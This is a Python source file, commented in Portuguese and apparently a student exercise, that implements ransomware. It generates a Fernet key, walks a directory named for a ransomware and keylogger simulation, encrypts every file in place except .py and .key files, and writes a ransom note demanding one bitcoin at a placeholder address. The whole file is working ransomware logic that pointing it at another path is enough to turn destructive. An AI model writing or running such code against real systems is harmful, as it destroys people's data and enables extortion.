from cryptography.fernet import Fernet
import os

#1 Gerar chave de criptografia 

def gerar_chave():
    chave = Fernet.generate_key() 
    with open ("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2 Carregar a chave
def carregar_chave():
    return open("chave.key", "rb").read()

#3 Criptografar arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave) 
    with open(arquivo, "rb") as file:
        dados = file.read()
    
    dados_encriptados = f.encrypt(dados) 
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4 Encontrar arquivos para criptografar
def procurar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if not nome.endswith((".py", ".key")):
                lista.append(caminho)
    return lista

#5 Mensagem de resgate
def mensagem_resgate():
    with open("LEIA ISSO AGORA.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcoin para esse endereço: oadsidoiajsdoi\n")
        f.write("Envie o comprovante para liberar seus arquivos.\n")

#6 Execução do código
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = procurar_arquivos("Ramsonware e Keylogger Simulation")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    
    mensagem_resgate()

    print("Ransomware executado, arquivos criptografados")

if __name__ == "__main__":
    main()